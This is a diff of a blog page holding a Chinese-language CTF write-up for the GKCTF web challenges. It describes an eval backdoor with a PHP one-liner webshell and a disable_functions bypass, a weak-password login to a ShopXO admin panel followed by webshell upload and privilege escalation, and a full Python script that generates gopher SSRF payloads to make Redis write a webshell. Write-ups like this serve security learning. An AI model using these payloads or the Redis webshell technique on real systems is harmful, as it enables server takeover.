@@ -6,20 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: 代码审计、代码注入 | Welcome to Tristan&#39;s Blog!</title>
+  <title>GKCTF-wp | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="南京邮电大学2018级，web狗~；个人技术分享博客~">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:url" content="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%81%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/index.html">
+  <meta name="description" content="GKCTF-wp(Web)好久不更博客了，最近两个月主要精力放在学习开发上了，正好有时间就把GKCTFweb部分复现一下。 Checkin考察知识点：rce,绕过disable_function点开即得到页面源码： &lt;title&gt;Check_In&lt;&#x2F;title&gt; &lt;?php  highlight_file(__FILE__); class ClassName {">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GKCTF-wp">
+<meta property="og:url" content="http://yoursite.com/2020/06/09/GKCTF-wp/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="南京邮电大学2018级，web狗~；个人技术分享博客~">
+<meta property="og:description" content="GKCTF-wp(Web)好久不更博客了，最近两个月主要精力放在学习开发上了，正好有时间就把GKCTFweb部分复现一下。 Checkin考察知识点：rce,绕过disable_function点开即得到页面源码： &lt;title&gt;Check_In&lt;&#x2F;title&gt; &lt;?php  highlight_file(__FILE__); class ClassName {">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/image/62.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/63.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/64.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/65.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/66.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/67.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/68.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/69.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/06/09/images/70.jpg">
+<meta property="article:published_time" content="2020-06-09T01:42:40.000Z">
+<meta property="article:modified_time" content="2020-06-09T02:39:44.303Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="CTFer，hardworking">
-<meta property="article:tag" content="passionate">
+<meta property="article:tag" content="Web，SSRF，RCE">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/06/09/image/62.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
   
@@ -137,60 +147,203 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-GKCTF-wp" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/18/Create-function/" class="archive-article-date">
-  	<time datetime="2020-04-18T12:06:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-18</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/18/Create-function/">Create_function</a>
+    <h1 class="article-title" itemprop="name">
+      GKCTF-wp
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/06/09/GKCTF-wp/" class="archive-article-date">
+  	<time datetime="2020-06-09T01:42:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="GKCTF-wp-Web"><a href="#GKCTF-wp-Web" class="headerlink" title="GKCTF-wp(Web)"></a>GKCTF-wp(Web)</h3><p>好久不更博客了，最近两个月主要精力放在学习开发上了，正好有时间就把GKCTFweb部分复现一下。</p>
+<h4 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h4><h5 id="考察知识点：rce-绕过disable-function"><a href="#考察知识点：rce-绕过disable-function" class="headerlink" title="考察知识点：rce,绕过disable_function"></a>考察知识点：rce,绕过disable_function</h5><p>点开即得到页面源码：</p>
+<pre><code>&lt;title&gt;Check_In&lt;/title&gt;
+&lt;?php 
+highlight_file(__FILE__);
+class ClassName
+{
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        {
+                $this-&gt;code = @$this-&gt;x()[&apos;Ginkgo&apos;];
+                $this-&gt;decode = @base64_decode( $this-&gt;code );
+                @Eval($this-&gt;decode);
+        }
+
+        public function x()
+        {
+                return $_REQUEST;
+        }
+}
+new ClassName();</code></pre><p>发现可以直接构造命令执行，对“@eval($_POST[aaa]);”进行base64操作即可，使用蚁剑连接；发现根目录下有/readflag，做多了就知道肯定是用这个读取flag的，发现命令都被ban了，于是使用绕过disable_funciton的POC，在/tmp目录上传文件后，包含即可得到flag</p>
+<pre><code>aaa=include(&quot;/tmp/exp.php&quot;);</code></pre><p><img src="../image/62.jpg" alt="1"></p>
+<h3 id="CVE签到"><a href="#CVE签到" class="headerlink" title="CVE签到"></a>CVE签到</h3><h4 id="考察知识点：CVE-2020-7066"><a href="#考察知识点：CVE-2020-7066" class="headerlink" title="考察知识点：CVE-2020-7066"></a>考察知识点：CVE-2020-7066</h4><p>进去后，提示我们可以访问任意*.ctfhub.com<br>该CVE主要是可以使用某些方法使得get_headers()请求到错误的主机，从而造成信息泄露<br>尝试输入127.0.0.1%00.ctfhub.com：<br><img src="../images/63.jpg" alt="2"><br>提示要求123结尾，修改后得到flag：<br><img src="../images/64.jpg" alt="3"></p>
+<h3 id="老八小超市"><a href="#老八小超市" class="headerlink" title="老八小超市"></a>老八小超市</h3><h4 id="考察知识点：弱口令登陆，getshell"><a href="#考察知识点：弱口令登陆，getshell" class="headerlink" title="考察知识点：弱口令登陆，getshell"></a>考察知识点：弱口令登陆，getshell</h4><p>进去后是shopxo的商城，百度了shopxo的漏洞，可参考：<a href="http://www.nctry.com/1660.html。" target="_blank" rel="noopener">http://www.nctry.com/1660.html。</a><br>进入后台登陆页面，使用弱口令（admin:shopxo）登陆，下载一个免费主题后，将准备好的一句话木马添加进去；然后安装主题，找到一句话木马的路径（<a href="http://xxx.com/public/static/index/default/test.php）" target="_blank" rel="noopener">http://xxx.com/public/static/index/default/test.php）</a><br>使用蚁剑连接后，发现根目录下的flag提示真正的flag在/root下，但当前用户权限不够，想到提权，但再观察一下根目录下有一个auto.sh文件，内容是执行/var/mail/makeflaghint.py这个文件。查看这个文件执行权写为root，且有写权限，于是利用写全写，让这个文件将/root/flag的内容写出来：<br><img src="../images/65.jpg" alt="4"><br>等一会儿即可得到flag<br><img src="../images/66.jpg" alt="5"></p>
+<h3 id="EzWeb"><a href="#EzWeb" class="headerlink" title="EzWeb"></a>EzWeb</h3><h4 id="考察知识点：SSRF-Gopher，Redis写Webshell"><a href="#考察知识点：SSRF-Gopher，Redis写Webshell" class="headerlink" title="考察知识点：SSRF+Gopher，Redis写Webshell"></a>考察知识点：SSRF+Gopher，Redis写Webshell</h4><p>进去后，给了一个查找ip功能，发现url中有关键字”url”，猜测是否为ssrf，F12后发现提示：通过?secret后得到ip地址：<br><img src="../images/67.jpg" alt="6"><br>用BP扫一下内网后，发现共有5个ip存活：<br><img src="../images/68.jpg" alt="7"><br>依次访问后，发现11有提示信息。对11进行端口扫描，发现6379Redis开放。大概有了思路，利用ssrf打Redis，发现file,dict协议都被ban了（这里其实可以这样用file，file:/etc/passwd或file: ///var/www/html/index.php)也可以读取本地文件信息：<br><img src="../images/69.jpg" alt="8"><br>gopher没有，于是使用gopher协议写webshell：</p>
+<pre><code>import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;173.222.47.11&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+    &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+    &quot;config set dir {}&quot;.format(path),
+    &quot;config set dbfilename {}&quot;.format(filename),
+    &quot;save&quot;
+    ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print(payload)</code></pre><p>提交后，执行命令即可拿到flag,这里过滤了空格，使用${IFS}绕过即可<br><img src="../images/70.jpg" alt="9"></p>
+<p>还有三道题目个人觉得学到很多，值得单独详细分析一下，就放到下一篇</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计、代码注入</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Web，SSRF，RCE</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/06/09/GKCTF-wp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/04/29/PRCE%E5%9B%9E%E6%BA%AF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PRCE回溯</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -213,9 +366,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
